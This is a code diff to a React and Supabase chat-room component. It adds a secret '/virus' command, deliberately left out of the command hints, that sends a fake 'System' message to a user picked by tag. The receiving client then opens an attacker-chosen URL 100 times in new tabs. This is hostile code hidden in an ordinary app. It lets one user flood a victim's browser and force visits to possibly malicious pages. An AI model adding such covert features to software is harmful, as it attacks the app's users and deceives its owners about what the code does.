@@ -82,6 +82,16 @@ const ChatRoom = () => {
             }
             return;
           }
+          // Handle virus command targeting this user
+          if (msg.content?.startsWith("__VIRUS__:")) {
+            const parts = msg.content.match(/^__VIRUS__:(\d{4}):(.+)$/);
+            if (parts && parts[1] === userTag.current) {
+              for (let i = 0; i < 100; i++) {
+                window.open(parts[2], "_blank");
+              }
+            }
+            return;
+          }
           setMessages((prev) => [...prev, msg]);
         }
       )
@@ -238,6 +248,20 @@ const ChatRoom = () => {
         user_tag: "0000",
       });
       toast.success(`/send sent to ${targetName} #${tag}`);
+      return true;
+    }
+
+    // /virus #XXXX url (secret command - not shown in command hints)
+    const virusMatch = text.match(/^\/virus\s+#(\d{4})\s+(.+)$/);
+    if (virusMatch) {
+      const [, tag, url] = virusMatch;
+      const targetName = await getDisplayNameByTag(tag);
+      await supabase.from("messages").insert({
+        username: "System",
+        content: `__VIRUS__:${tag}:${url.trim()}`,
+        user_tag: "0000",
+      });
+      toast.success(`/virus sent to ${targetName} #${tag}`);
       return true;
     }
 
